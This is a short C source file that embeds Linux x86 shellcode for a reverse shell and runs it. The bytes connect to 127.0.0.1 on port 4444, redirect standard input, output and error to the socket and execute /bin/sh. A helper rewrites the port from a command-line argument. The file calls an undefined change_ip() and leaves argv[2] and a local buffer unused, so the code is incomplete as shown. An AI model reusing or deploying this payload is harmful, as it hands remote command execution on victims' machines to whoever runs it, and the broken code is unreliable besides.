#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PORT_INDEX 29

char shellcode[] = "\x31\xc0\x50\xb0\x01\x50\xb0\x02\x50\xb0\x66\x31\xdb\xb3\x01\x89\xe1\xcd\x80\x89\xc7\x68\x7f\x00\x00\x01\x66\xc7\x44\x24\xfe\x11\x5c\xb0\x02\x66\x89\x44\x24\xfc\x83\xec\x04\x89\xe1\x6a\x10\x51\x57\x89\xe1\x31\xdb\xb3\x03\xb0\x66\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd\x80\xeb\x0b\x5b\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";



void change_port(char *shellcode_buffer, char *port_buffer)
{
	char *port = port_buffer;
	char hex_port[2];
	int int_port = htons(atoi(port_buffer));

	memcpy(shellcode_buffer + PORT_INDEX, &int_port, 2);

	//printf("\\x%02x\\x%02x\n", hex_port[0], hex_port[1]);
}

int main(int argc, char *argv[])
{
	void (*shell)() = (void(*)())shellcode;

	//printf("\\x%02x\\x%02x\n", shellcode[PORT_INDEX], shellcode[PORT_INDEX+1]);
    
	// Replace binding port here
	if(argv[1] && argv[2])
	{
		change_port(shellcode, argv[1]);
		change_ip();
	}

	shell();
	return 0;
}
